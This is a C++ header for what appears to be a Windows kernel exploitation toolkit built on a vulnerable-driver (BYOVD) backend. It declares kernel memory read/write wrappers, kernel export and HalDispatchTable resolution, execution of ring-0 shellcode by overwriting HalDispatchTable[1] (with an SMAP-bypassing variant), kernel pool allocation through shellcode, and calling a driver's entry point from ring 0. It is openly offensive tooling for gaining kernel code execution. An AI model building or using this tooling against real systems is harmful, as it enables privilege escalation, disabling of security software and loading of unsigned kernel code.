#pragma once
#include <windows.h>
#include <cstdint>
#include <string>
#include <vector>
#include <functional>

#include "hinv_byovd.hpp"

namespace hinv {
namespace kmem {

// Loaded kernel module descriptor.
struct KernelModule {
    std::wstring name;
    uint64_t     base = 0;
    uint32_t     size = 0;
};

// Normalize a module file name or path to the canonical kernel module name.
// Handles paths, extensions, and common kernel module aliases.
std::wstring NormalizeModuleName(const std::string& moduleName);
std::wstring NormalizeModuleName(const std::wstring& moduleName);

// Enumerate loaded kernel modules using NtQuerySystemInformation(SystemModuleInformation).
std::vector<KernelModule> EnumKernelModules();

// Resolve kernel export RVA using in-memory PE parsing via backend read.
// Returns 0 on failure.
uint64_t GetKernelExport(byovd::IByovdBackend* backend, uint64_t moduleBase, const char* exportName);

// Resolve a kernel export by module name + export name.
uint64_t ResolveKernelExport(byovd::IByovdBackend* backend, const wchar_t* moduleName, const char* exportName);

// Find HalDispatchTable virtual address in ntoskrnl.
uint64_t FindHalDispatchTable(byovd::IByovdBackend* backend);

// Windows version info used to pick kernel structure layouts.
struct OsVersionInfo {
    uint32_t major = 0;
    uint32_t minor = 0;
    uint32_t build = 0;
    uint32_t revision = 0;
};

// Get OS version via NtQuerySystemInformation(SystemVersionInformation).
OsVersionInfo GetOsVersion();

// Acquire a kernel guarded mutex or ERESOURCE by address.
// type: 0 = ExAcquireResourceExclusiveLite, 1 = KeAcquireGuardedMutex
bool AcquireKernelLock(byovd::IByovdBackend* backend, uint64_t lockAddress, int type);

// Release a kernel lock previously acquired with AcquireKernelLock.
bool ReleaseKernelLock(byovd::IByovdBackend* backend, uint64_t lockAddress, int type);

// Read/write primitive wrappers for convenience.
inline bool ReadU64(byovd::IByovdBackend* b, uint64_t va, uint64_t& out) { return b->ReadKernelMemory(va, &out, sizeof(out)); }
inline bool ReadU32(byovd::IByovdBackend* b, uint64_t va, uint32_t& out) { return b->ReadKernelMemory(va, &out, sizeof(out)); }
inline bool WriteU64(byovd::IByovdBackend* b, uint64_t va, uint64_t in)   { return b->WriteKernelMemory(va, &in, sizeof(in)); }
inline bool WriteU32(byovd::IByovdBackend* b, uint64_t va, uint32_t in)   { return b->WriteKernelMemory(va, &in, sizeof(in)); }

// Execute a small kernel shellcode via HalDispatchTable[1] overwrite.
//   shellcode  : bytes to execute in Ring 0
//   arg1, arg2 : 64-bit arguments passed in RCX, RDX (shellcode must follow Windows x64 ABI)
//   outResult  : optional 64-bit return value read from a fixed sentinel
// Returns true if the trigger appeared to fire.
bool ExecuteKernelShellcode(byovd::IByovdBackend* backend,
                            const std::vector<uint8_t>& shellcode,
                            uint64_t arg1 = 0,
                            uint64_t arg2 = 0,
                            uint64_t* outResult = nullptr);

// SMAP-safe kernel execution: the context block is copied into the same kernel scratch
// page as the shellcode before execution. The builder receives the scratch page base
// and must return a context vector whose internal pointers already reference that page.
// After execution, the first qword of the kernel context is returned in outResult.
using ContextBuilder = std::function<std::vector<uint8_t>(uint64_t scratchBase)>;

bool ExecuteKernelShellcodeSmapSafe(byovd::IByovdBackend* backend,
                                    const std::vector<uint8_t>& shellcode,
                                    ContextBuilder buildContext,
                                    uint64_t* outResult = nullptr);

// Allocate kernel memory by executing a tiny allocator shellcode.
// Uses ExAllocatePool2 on Win10+ or ExAllocatePoolWithTag on older systems.
bool AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size, uint64_t& outKernelVa);

// Free previously allocated kernel memory via ExFreePoolWithTag.
bool FreeKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa);

// Resolve a kernel DriverObject by name (e.g. L"\\Driver\\Null") using ObReferenceObjectByName.
// Returns the object pointer (kernel VA) or 0.
uint64_t GetDriverObject(byovd::IByovdBackend* backend, const wchar_t* driverName);

// Call a driver entry point from Ring 0. Returns the NTSTATUS produced by DriverEntry.
uint32_t CallDriverEntry(byovd::IByovdBackend* backend, uint64_t driverEntryVa,
                         uint64_t driverObjectVa, uint64_t registryPathVa);

// Callback signature for a user-supplied kernel execution primitive.
using KernelExecCallback = std::function<bool(const std::vector<uint8_t>& shellcode, uint64_t arg1, uint64_t arg2, uint64_t* out)>;

} // namespace kmem
} // namespace hinv
